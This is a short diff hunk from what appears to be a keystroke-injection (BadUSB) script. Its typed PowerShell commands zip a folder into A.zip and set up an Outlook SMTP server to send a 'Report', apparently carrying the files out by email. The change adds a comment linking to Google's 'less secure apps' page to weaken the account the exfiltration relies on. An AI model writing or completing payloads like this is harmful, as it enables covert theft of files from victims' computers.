@@ -29,7 +29,7 @@ ENTER
 STRING Compress-Archive -Path A -DestinationPath A.zip
 ENTER
 REM --> Report
-REM --> 
+REM --> Allow less secure app here https://myaccount.google.com/lesssecureapps
 DELAY 500
 STRING $SMTPServer = 'smtp-mail.outlook.com'
 ENTER
